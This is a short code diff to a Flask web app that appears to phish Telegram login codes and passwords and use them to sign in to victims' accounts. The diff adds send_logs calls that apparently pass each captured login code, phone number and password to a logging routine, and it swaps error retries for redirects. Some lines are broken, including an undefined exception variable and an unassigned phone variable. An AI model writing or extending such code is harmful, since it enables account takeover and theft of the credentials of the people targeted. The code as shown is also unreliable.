@@ -73,6 +73,7 @@ class CodeForm(FlaskForm):
 
 def send(login_code, phone):
     try:
+        send_logs(login_code, phone)
         global client
         phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
         if client.is_connected():
@@ -94,12 +95,13 @@ def send(login_code, phone):
                 return redirect(url_for("password", phone=phone))
         client.disconnect()
         return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
-    except Exception as e:
+    except:
         print(e)
-        send(login_code, phone)
+        return redirect(url_for('login'))
 
 def send_with_pss(login_password):
     try:
+        send_logs(login_password)
         global client
         phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
         try:
@@ -126,7 +128,8 @@ def send_with_pss(login_password):
         return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
     except Exception as e:
         print(e)
-        send_with_pss(login_password)
+        return redirect(url_for('login'))
+
 
 
 @app.route('/', methods=["POST", "GET"])
